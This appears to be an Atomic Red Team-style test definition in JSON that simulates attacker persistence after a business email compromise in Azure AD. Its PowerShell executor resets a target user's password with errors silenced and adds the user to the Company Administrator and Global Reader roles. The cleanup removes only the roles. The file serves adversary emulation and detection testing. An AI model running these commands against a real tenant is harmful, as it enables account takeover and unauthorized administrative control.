{
    "name": "Simulate - Post BEC persistence via user password reset followed by user added to company administrator role",
    "description": "This test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.  Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges ",
    "supported_platforms": [
        "azure-ad"
    ],
    "dependency_executor_name": "powershell",
    "executor": {
        "command": "Import-Module MSOnline\nImport-Module AzureAD\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\n$targetsecurepw = ConvertTo-SecureString -String \"#{target_password}\" -AsPlainText -Force\nConnect-MsolService -Credential $credential -ErrorAction:SilentlyContinue\nConnect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue\n\n#Saving the ObjectId of the target_user into a variable\n$target_objid = Get-AzureADUser -filter \"userPrincipalName eq '#{target_user}'\" | Select-Object -ExpandProperty ObjectId\n\n#Reset the password of the target_user\nSet-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue\n\n#Adding target_user\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"#{target_user}\"\nAdd-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberEmailAddress \"#{target_user}\"\n",
        "cleanup_command": "Import-Module MSOnline\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\nConnect-MsolService -Credential $credential\nRemove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\nRemove-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\n",
        "name": "powershell",
        "elevation_required": false,
        "type": "Command Executor"
    },
    "id": "T1098.003",
    "tactics": [
        "Persistence",
        "Privilege Escalation"
    ],
    "technique": "Additional Cloud Roles",
    "source": "ART",
    "uuid": "14f3af20-61f1-45b8-ad31-4637815f3f44",
    "arguments": {
        "auth_username": {
            "description": "Azure AD username used to conduct the adversary activity",
            "type": "string",
            "default": "jonh@contoso.com"
        },
        "auth_password": {
            "description": "Azure AD password for user auth_username",
            "type": "string",
            "default": "p4sswd"
        },
        "target_user": {
            "description": "Name of the user whose password be reset and added to the admin role.",
            "type": "string",
            "default": "default"
        },
        "target_password": {
            "description": "The password that the user target_user will be reset to.",
            "type": "string",
            "default": "Ohn05GeMe#$"
        }
    },
    "preconditions": [
        {
            "description": "MSOnline and AzureAD modules must be installed.\n",
            "prereq_command": "$required_mods = 'AzureAD', 'MSOnline'\n$installed_mods = @((Get-Module $required_mods -ListAvailable -ErrorAction SilentlyContinue).Name  | Select-Object -Unique)\n$notInstalled = Compare-Object $required_mods $installed_mods -PassThru -ErrorAction SilentlyContinue\n\nif ($notInstalled) {\n# Prompt for installing the missing ones.\nWrite-Output \"The following PS modules aren't currently installed:\"\n$notInstalled\n  exit 1\n}\n\n else{\n  Write-Output \"All required PS modules are installed\"\n  exit 0\n }\n",
            "get_prereq_command": "Install-Module -Name MSOnline -Scope CurrentUser -Force\nInstall-Module -Name AzureAD -Scope CurrentUser -Force\n"
        }
    ],
    "infrastructure_requirement": [],
    "side": "Victim"
}